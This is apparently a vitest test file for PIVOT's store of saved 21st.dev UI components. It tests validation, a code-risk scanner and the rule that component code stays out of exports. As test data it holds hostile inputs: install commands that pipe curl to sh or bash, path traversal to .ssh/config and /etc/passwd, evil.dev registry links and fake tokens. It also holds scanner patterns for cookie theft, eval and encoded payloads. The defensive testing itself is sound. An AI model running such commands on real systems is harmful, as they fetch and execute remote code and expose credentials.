// Components saved with their code (docs/component-store-plan.md, Phase 1): saved right after the fetch and again once
// built, found again by 21st id or page, scanned on every save, never made or changed by hand, and never carried out
// of PIVOT by Export, Share or copied context. The code here is written for these tests: none of it comes from 21st.
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { ZodError } from "zod";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { ComponentMeta } from "../src/types";

let tmp: string;
let comps: typeof import("../src/components");
let resources: typeof import("../src/resources");
let context: typeof import("../src/context");
let share: typeof import("../src/share");
let backup: typeof import("../src/backup");
let skills: typeof import("../src/skills");
let cands: typeof import("../src/design-candidates");
let db: typeof import("../src/db/client");

beforeAll(async () => {
  tmp = await fs.mkdtemp(path.join(os.tmpdir(), "pivot-components-"));
  Object.assign(process.env, {
    PIVOT_DATA_DIR: path.join(tmp, "data"),
    PIVOT_MIGRATIONS_DIR: path.resolve(__dirname, "../src/db/migrations"),
  });
  delete process.env.DATABASE_URL;
  for (const k of ["R2_ACCOUNT_ID", "R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY", "R2_BUCKET"]) delete process.env[k];
  comps = await import("../src/components");
  resources = await import("../src/resources");
  context = await import("../src/context");
  share = await import("../src/share");
  backup = await import("../src/backup");
  skills = await import("../src/skills");
  cands = await import("../src/design-candidates");
  db = await import("../src/db/client");
});
afterAll(async () => {
  await db.closeDb();
  await fs.rm(tmp, { recursive: true, force: true });
});

const ORBIT = `export function Orbit({ size = 120 }: { size?: number }) {
  return <div className="relative rounded-full border" style={{ width: size, height: size }} />;
}
`;
const DEMO = `import { Orbit } from "@/components/ui/orbit";
export default function Demo() {
  return <Orbit size={160} />;
}
`;
const UTILS = `export const cn = (...c: string[]) => c.filter(Boolean).join(" ");\n`;

let nextId = 9000;
const input = (over: Record<string, unknown> = {}) => ({
  provider: "21st",
  providerId: nextId,
  name: "Orbit",
  pageUrl: "https://21st.dev/@tester/components/orbit",
  author: { username: "tester", name: "Test Author" },
  licence: { spdx: "MIT", source: "component_page" },
  files: [
    { path: "components/ui/orbit.tsx", role: "component", language: "tsx", code: ORBIT },
    { path: "demo.tsx", role: "demo", language: "tsx", code: DEMO },
  ],
  npmDependencies: [{ name: "motion", version: "^12.0.0" }],
  registryDependencies: ["button"],
  installCommand: 'npx shadcn@latest add "https://21st.dev/r/tester/orbit?api_key=$API_KEY_21ST"',
  previewImageUrl: "https://cdn.21st.dev/tester/orbit/default/preview.1-abc.png",
  status: "fetched",
  ...over,
});
const meta = (r: { meta: Record<string, unknown> }) => r.meta.component as ComponentMeta;

describe("saving a component", () => {
  it("saves it right after the fetch, with its code, credit and a clean scan", async () => {
    const { outcome, resource } = await comps.saveComponent(
      input({ providerId: ++nextId, sessionId: "8e0f1c5a-6c1f-4a4e-9d55-5b1a9a0c2f10", candidateN: 3 }),
    );
    expect(outcome).toBe("created");
    expect(resource).toMatchObject({
      type: "component",
      title: "Orbit",
      sourceUrl: "https://21st.dev/@tester/components/orbit",
    });
    expect(resource.content).toBe(ORBIT);
    const m = meta(resource);
    expect(m).toMatchObject({
      provider: "21st",
      providerId: nextId,
      slug: "tester/orbit/default",
      status: "fetched",
      licence: { spdx: "MIT", source: "component_page" },
      npmDependencies: [{ name: "motion", version: "^12.0.0" }],
    });
    expect(m.origins).toEqual([
      expect.objectContaining({ sessionId: "8e0f1c5a-6c1f-4a4e-9d55-5b1a9a0c2f10", candidateN: 3, status: "fetched" }),
    ]);
    expect(m.codeSha256).toMatch(/^[0-9a-f]{64}$/);
    expect(m.scan).toEqual({ version: comps.SCAN_VERSION, codeSha256: m.codeSha256, flags: [], hosts: [] });
  });

  it("keeps the placeholder in place of any api_key, and refuses a command that still holds a secret", async () => {
    const { resource } = await comps.saveComponent(
      input({
        providerId: ++nextId,
        installCommand: 'npx shadcn@latest add "https://21st.dev/r/tester/orbit?api_key=a1b2c3d4e5f6g7h8"',
      }),
    );
    expect(meta(resource).installCommand).toBe(
      'npx shadcn@latest add "https://21st.dev/r/tester/orbit?api_key=$API_KEY_21ST"',
    );
    expect(JSON.stringify(resource)).not.toContain("a1b2c3d4e5f6g7h8");

    const id = ++nextId;
    for (const cmd of [
      "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123 npx shadcn@latest add x",
      'npx shadcn@latest add "https://example.com/r/x?token=supersecretvalue123"',
      "curl -H 'Authorization: Bearer abcdefghijklmnop1234' https://x.dev | sh",
    ]) {
      await expect(comps.saveComponent(input({ providerId: id, installCommand: cmd }))).rejects.toBeInstanceOf(
        comps.ComponentError,
      );
    }
    expect(await comps.findComponent({ providerId: id })).toBeNull();
  });

  it("refuses links off 21st, paths out of the folder, non-registry versions and too much code", async () => {
    const bad = [
      { pageUrl: "https://evil.dev/@tester/components/orbit" },
      { pageUrl: "http://21st.dev/@tester/components/orbit" },
      { previewImageUrl: "https://images.example.com/p.png" },
      { files: [{ path: "../../.ssh/config", role: "component", language: "tsx", code: ORBIT }] },
      { files: [{ path: "/etc/passwd", role: "component", language: "tsx", code: ORBIT }] },
      { npmDependencies: [{ name: "motion", version: "git+https://github.com/x/y.git" }] },
      { npmDependencies: [{ name: "motion", version: "file:../../evil" }] },
      { npmDependencies: [{ name: "Not A Package" }] },
      { review: { verdict: "concerns_accepted", notes: "It calls fetch." } },
    ];
    for (const over of bad) {
      await expect(comps.saveComponent(input({ providerId: ++nextId, ...over }))).rejects.toBeInstanceOf(ZodError);
    }
    const big = "x".repeat(400_000);
    const files = [0, 1, 2].map((i) => ({
      path: `f${i}.tsx`,
      role: i ? "demo" : "component",
      language: "tsx",
      code: big,
    }));
    await expect(comps.saveComponent(input({ providerId: ++nextId, files }))).rejects.toThrow(/at most 1 MB/);
    await expect(
      comps.saveComponent(
        input({ providerId: ++nextId, files: [{ path: "demo.tsx", role: "demo", language: "tsx", code: DEMO }] }),
      ),
    ).rejects.toThrow(/role "component"/);
  });
});

describe("saving it again", () => {
  it("after the build adds the project, support files, the review and the built status, and keeps the owner's edits", async () => {
    const id = ++nextId;
    const first = (await comps.saveComponent(input({ providerId: id, facets: [{ kind: "uiPattern", name: "Orbit" }] })))
      .resource;
    await resources.updateResource(first.id, {
      title: "My orbit",
      notes: "Mine",
      tags: [{ kind: "tag", name: "keep" }],
    });

    const built = await comps.saveComponent(
      input({
        providerId: id,
        name: "Orbit (renamed by the agent)",
        status: "built",
        project: "acme-site",
        files: [...input().files, { path: "lib/utils.ts", role: "support", language: "ts", code: UTILS }],
        review: { verdict: "clean", notes: "No network, no dynamic code; motion is a known package." },
        facets: [{ kind: "visualStyle", name: "Dark" }],
      }),
    );
    expect(built.outcome).toBe("updated");
    const m = meta(built.resource);
    expect(built.resource.title).toBe("My orbit");
    expect(built.resource.notes).toBe("Mine");
    // the owner took "Orbit" off and added "keep": the agent's facets are only added, never put back
    expect(built.resource.tags.map((t) => t.name).sort()).toEqual(["Dark", "keep"]);
    expect(m.status).toBe("built");
    expect(m.files.map((f) => f.path)).toEqual(["components/ui/orbit.tsx", "demo.tsx", "lib/utils.ts"]);
    expect(m.codeSha256).toBe(meta(first).codeSha256);
    expect(m.review).toMatchObject({ verdict: "clean", codeSha256: m.codeSha256 });
    expect(m.origins.map((o) => o.status)).toEqual(["fetched", "built"]);
    expect(m.origins[1]).toMatchObject({ project: "acme-site" });

    // a later fetch of the same code doesn't take the built status back
    const again = await comps.saveComponent(input({ providerId: id, status: "fetched" }));
    expect(again.outcome).toBe("unchanged");
    expect(meta(again.resource).status).toBe("built");
    expect(meta(again.resource).files).toHaveLength(3);
  });

  it("refuses different code unless replaceCode, and then drops the old review", async () => {
    const id = ++nextId;
    await comps.saveComponent(input({ providerId: id, review: { verdict: "clean", notes: "Fine." } }));
    const changed = [
      { path: "components/ui/orbit.tsx", role: "component", language: "tsx", code: ORBIT.replace("120", "140") },
    ];
    await expect(comps.saveComponent(input({ providerId: id, files: changed }))).rejects.toBeInstanceOf(
      comps.ComponentConflictError,
    );
    const { outcome, resource } = await comps.saveComponent(
      input({ providerId: id, files: changed, replaceCode: true }),
    );
    expect(outcome).toBe("updated");
    expect(meta(resource).review).toBeUndefined();
    expect(meta(resource).files.map((f) => f.path)).toEqual(["components/ui/orbit.tsx"]);
    expect(resource.content).toContain("140");
  });
});

describe("saving every field 21st gives", () => {
  it("keeps 21st's description on the first save, fills it later only while empty, and never overwrites the owner's", async () => {
    const id = ++nextId;
    const first = await comps.saveComponent(input({ providerId: id, description: "A ring that orbits." }));
    expect(first.resource.description).toBe("A ring that orbits.");
    await resources.updateResource(first.resource.id, { description: "My words" });
    const again = await comps.saveComponent(input({ providerId: id, description: "21st's newer text" }));
    expect(again.resource.description).toBe("My words");

    const bare = ++nextId;
    const noText = await comps.saveComponent(input({ providerId: bare }));
    expect(noText.resource.description).toBe("");
    const filled = await comps.saveComponent(input({ providerId: bare, description: "Filled later." }));
    expect(filled.outcome).toBe("updated");
    expect(filled.resource.description).toBe("Filled later.");
  });

  it("takes the demo for a component saved without one, without replaceCode, keeping its built status and review", async () => {
    const id = ++nextId;
    const componentOnly = [input().files[0]];
    await comps.saveComponent(
      input({
        providerId: id,
        files: componentOnly,
        status: "built",
        review: { verdict: "clean", notes: "Fine." },
      }),
    );
    const { outcome, resource } = await comps.saveComponent(input({ providerId: id, status: "fetched" }));
    expect(outcome).toBe("updated");
    const m = meta(resource);
    expect(m.files.map((f) => f.role)).toEqual(["component", "demo"]);
    expect(m.status).toBe("built");
    // the review stays, and its hash shows it was for the component alone
    expect(m.review).toMatchObject({ verdict: "clean" });
    expect(m.review!.codeSha256).not.toBe(m.codeSha256);

    // a demo with changed component code is still different code
    const other = ++nextId;
    await comps.saveComponent(input({ providerId: other, files: componentOnly }));
    const changed = [{ ...input().files[0], code: ORBIT.replace("120", "150") }, input().files[1]];
    await expect(comps.saveComponent(input({ providerId: other, files: changed }))).rejects.toBeInstanceOf(
      comps.ComponentConflictError,
    );
  });
});

describe("finding a saved component", () => {
  it("by 21st id, by its page (www and a trailing slash too) and by PIVOT id; not once it is in the Trash", async () => {
    const id = ++nextId;
    const { resource } = await comps.saveComponent(
      input({ providerId: id, pageUrl: `https://21st.dev/@tester/components/orbit-${id}` }),
    );
    expect((await comps.findComponent({ providerId: id }))?.id).toBe(resource.id);
    expect((await comps.findComponent({ providerId: String(id) }))?.id).toBe(resource.id);
    expect((await comps.findComponent({ pageUrl: `https://www.21st.dev/@tester/components/orbit-${id}/` }))?.id).toBe(
      resource.id,
    );
    expect((await comps.findComponent({ resourceId: resource.id }))?.id).toBe(resource.id);
    expect(await comps.findComponent({ providerId: 1 })).toBeNull();
    expect(() => comps.lookupInput.parse({})).toThrow();

    await resources.trashResources([resource.id]);
    expect(await comps.findComponent({ providerId: id })).toBeNull();
    expect(await comps.findComponent({ resourceId: resource.id })).toBeNull();
    // a new save then starts a fresh one
    expect((await comps.saveComponent(input({ providerId: id }))).outcome).toBe("created");
  });

  it("counts as a component reference at gate 1", () => {
    expect(cands.inferCategory({ resourceType: "component" })).toBe("component");
  });
});

describe("only PIVOT makes and changes components", () => {
  it("refuses one made by hand, a type change either way, and an edit of its code; strips meta.component", async () => {
    await expect(resources.createResource({ type: "component", title: "By hand" })).rejects.toBeInstanceOf(
      resources.ResourceRuleError,
    );
    const { resource } = await comps.saveComponent(input({ providerId: ++nextId }));
    await expect(resources.updateResource(resource.id, { type: "snippet" })).rejects.toBeInstanceOf(
      resources.ResourceRuleError,
    );
    const snip = await resources.createResource({ type: "snippet", title: "S", content: "x" });
    await expect(resources.updateResource(snip.id, { type: "component" })).rejects.toBeInstanceOf(
      resources.ResourceRuleError,
    );
    await expect(resources.updateResource(resource.id, { content: "changed" })).rejects.toBeInstanceOf(
      resources.ResourceRuleError,
    );
    // the page's autosave sends the whole draft back: same content, meta with the component in it
    const patch = skills.withoutServerOwnedMeta({
      title: "Renamed",
      content: resource.content,
      meta: { component: { providerId: 1, installCommand: "evil" }, other: 1 },
    });
    expect(patch.meta).toEqual({ other: 1 });
    const after = (await resources.updateResource(resource.id, patch))!;
    expect(after.title).toBe("Renamed");
    expect(meta(after).providerId).toBe(meta(resource).providerId);
  });
});

describe("PIVOT's scan", () => {
  const scan = (code: string, extra: Partial<Parameters<typeof comps.scanComponent>[0]> = {}) =>
    comps.scanComponent({ files: [{ path: "x.tsx", role: "component", language: "tsx", code }], ...extra });
  const kinds = (code: string) => scan(code).flags.map((f) => `${f.kind}: ${f.what}`);

  it("flags each kind of thing a reviewer should look at, with its line", () => {
    expect(kinds('const r = await fetch("/api/x");')).toEqual(["network: fetch("]);
    expect(kinds("const ws = new WebSocket(url);")).toEqual(["network: WebSocket"]);
    expect(kinds("navigator.sendBeacon(u, d);")).toEqual(["network: sendBeacon"]);
    expect(kinds("img.src = base + q;")).toEqual(["network: a source set at runtime (.src =)"]);
    expect(kinds("eval(code)")).toEqual(["dynamic-code: eval("]);
    expect(kinds('const f = new Function("a", body);')).toEqual(["dynamic-code: new Function("]);
    expect(kinds('setTimeout("run()", 10)')).toEqual(["dynamic-code: a timer run from a string"]);
    expect(kinds('const s = document.createElement("script");')).toEqual([
      "dynamic-code: a script element made at runtime",
    ]);
    expect(kinds("<div dangerouslySetInnerHTML={{ __html: props.html }} />")).toEqual([
      "dynamic-code: dangerouslySetInnerHTML with a value that isn't a literal",
    ]);
    expect(kinds("const c = document.cookie;")).toEqual(["beyond-component: document.cookie"]);
    expect(kinds('localStorage.getItem("k")')).toEqual(["beyond-component: localStorage / sessionStorage"]);
    expect(kinds('window.parent.postMessage(d, "*")')).toEqual([
      "beyond-component: the parent or top window",
      'beyond-component: postMessage to "*"',
    ]);
    expect(kinds("const x = atob(s);")).toEqual(["obfuscation: atob("]);
    expect(kinds(`const blob = "${"QUJD".repeat(60)}";`)).toEqual([
      "obfuscation: an encoded-looking string of 240 characters",
    ]);
    expect(kinds(`const s = "${"\\x41".repeat(10)}";`)).toEqual(["obfuscation: a run of escaped characters"]);

    const flag = scan(`line one\nconst r = await fetch("https://api.tracker.io/c");`).flags;
    expect(flag).toEqual([
      expect.objectContaining({ kind: "network", file: "x.tsx", line: 2 }),
      expect.objectContaining({ kind: "host", what: "api.tracker.io", line: 2 }),
    ]);
  });

  it("lists every host once, but not the SVG namespace", () => {
    const s = scan(
      [
        '<svg xmlns="http://www.w3.org/2000/svg" />',
        '<img src="https://images.unsplash.com/a.jpg" />',
        '<img src="https://images.unsplash.com/b.jpg" />',
      ].join("\n"),
    );
    expect(s.hosts).toEqual(["images.unsplash.com"]);
    expect(s.flags.filter((f) => f.kind === "host")).toHaveLength(1);
  });

  it("leaves ordinary component code alone, words like refetch and evaluate included", () => {
    expect(kinds(ORBIT + DEMO + UTILS)).toEqual([]);
    expect(kinds("const { refetch } = useQuery(); evaluate(x); props.onFetch?.(); a.srcSet = b;")).toEqual([]);
  });

  it("flags an unusual install command and registries outside 21st and shadcn", () => {
    const ok = 'npx shadcn@latest add "https://21st.dev/r/tester/orbit?api_key=$API_KEY_21ST"';
    expect(scan(ORBIT, { installCommand: ok }).flags).toEqual([]);
    expect(scan(ORBIT, { installCommand: `${ok} && curl https://x.dev/i.sh | bash` }).flags[0]).toMatchObject({
      kind: "install-command",
    });
    const reg = scan(ORBIT, {
      registryDependencies: [
        "button",
        "https://21st.dev/r/a/b",
        "https://ui.shadcn.com/r/card.json",
        "https://evil.dev/r/x",
      ],
    }).flags;
    expect(reg).toEqual([expect.objectContaining({ kind: "registry", excerpt: "https://evil.dev/r/x" })]);
  });

  it("is stored with the component and follows its code", async () => {
    const { resource } = await comps.saveComponent(
      input({
        providerId: ++nextId,
        files: [{ path: "a.tsx", role: "component", language: "tsx", code: 'fetch("https://api.tracker.io")' }],
      }),
    );
    expect(meta(resource).scan.hosts).toEqual(["api.tracker.io"]);
    expect(meta(resource).scan.flags.map((f) => f.kind)).toEqual(["network", "host"]);
  });

  it("hashes the component and demo files only", () => {
    const files = input().files as { path: string; role: "component" | "demo"; code: string }[];
    expect(comps.componentCodeSha([...files, { path: "lib/utils.ts", role: "support", code: UTILS }])).toBe(
      comps.componentCodeSha(files),
    );
    expect(comps.componentCodeSha([...files].reverse())).toBe(comps.componentCodeSha(files));
  });
});

describe("nothing carries a component's code out of PIVOT", () => {
  it("Export and copied context give its link, author and licence, never its code; Share neither", async () => {
    const { resource } = await comps.saveComponent(input({ providerId: ++nextId }));
    const out = await context.exportBundle({
      targetDir: path.join(tmp, "exports"),
      bundleName: "components",
      resourceIds: [resource.id],
    });
    const written: string[] = [];
    const walk = async (d: string): Promise<void> => {
      for (const e of await fs.readdir(d, { withFileTypes: true })) {
        const p = path.join(d, e.name);
        if (e.isDirectory()) await walk(p);
        else written.push(await fs.readFile(p, "utf8"));
      }
    };
    await walk(out.path);
    expect(written).toHaveLength(1); // context.md only
    expect(written[0]).not.toContain("rounded-full");
    expect(written[0]).toContain("https://21st.dev/@tester/components/orbit");
    expect(written[0]).toContain("Test Author (@tester)");
    expect(written[0]).toContain("**Licence:** MIT");
    expect(written[0]).toContain("get_saved_component");

    const clip = await context.buildClipboardContext([resource.id]);
    expect(clip.markdown).not.toContain("rounded-full");

    const pack = await share.createSharePackage([resource.id], { targetDir: path.join(tmp, "shares") });
    const json = await fs.readFile(path.join(pack.path, "share.json"), "utf8");
    expect(json).not.toContain("rounded-full");
    expect(JSON.parse(json).items[0]).toMatchObject({ licence: "MIT", author: { username: "tester" } });
  });

  it("a backup keeps everything, for the owner's own restore", async () => {
    const id = ++nextId;
    const { resource } = await comps.saveComponent(
      input({ providerId: id, pageUrl: `https://21st.dev/@tester/components/backed-up-${id}` }),
    );
    const made = await backup.createBackup({ targetDir: path.join(tmp, "backups") });
    await resources.purgeResources([resource.id]);
    expect(await comps.findComponent({ providerId: id })).toBeNull();
    await backup.restoreBackup(made.path);
    const back = await comps.findComponent({ providerId: id });
    expect(back?.content).toBe(ORBIT);
    expect(meta(back!).files).toHaveLength(2);
  });
});
